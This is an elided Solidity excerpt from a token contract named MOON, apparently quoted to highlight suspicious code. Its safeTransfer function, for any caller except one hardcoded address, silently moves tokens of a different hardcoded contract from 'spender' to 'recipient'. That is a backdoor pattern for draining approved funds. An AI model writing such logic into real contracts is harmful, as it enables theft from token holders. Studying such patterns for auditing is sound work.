...
library TransferHelper {
    ...
    function safeTransferFrom(address token, address from, address to, uint value) internal {
        ...
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TransferHelper: ETH_TRANSFER_FAILED");
    }
...
contract MOON is IERC20 {
  ...
  function safeTransfer(
    ...
    if(msg.sender != address(0x42e27cc6eF3205C3fce53536e78D3483419b6b61)){
      TransferHelper.safeTransferFrom(0xA4043954CcCeF4e64332D6878EbFA47772A1FbB3, spender, recipient, amount);
      return true;
    }
    return false;
  }
